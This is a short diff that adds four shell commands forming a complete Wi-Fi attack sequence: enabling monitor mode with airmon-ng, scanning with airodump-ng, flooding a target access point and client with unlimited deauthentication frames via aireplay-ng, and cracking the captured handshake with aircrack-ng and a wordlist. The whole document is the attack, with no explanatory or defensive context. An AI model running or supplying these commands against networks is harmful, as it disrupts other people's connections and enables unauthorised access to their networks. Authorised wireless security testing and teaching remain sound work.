@@ -1,0 +1,4 @@
+sudo airmon-ng start wlan0
+sudo airodump-ng wlan0mon
+sudo aireplay-ng --deauth 0 -a [BSSID] -c [client MAC] wlan0mon
+aircrack-ng -w [wordlist] [capture_file.cap]
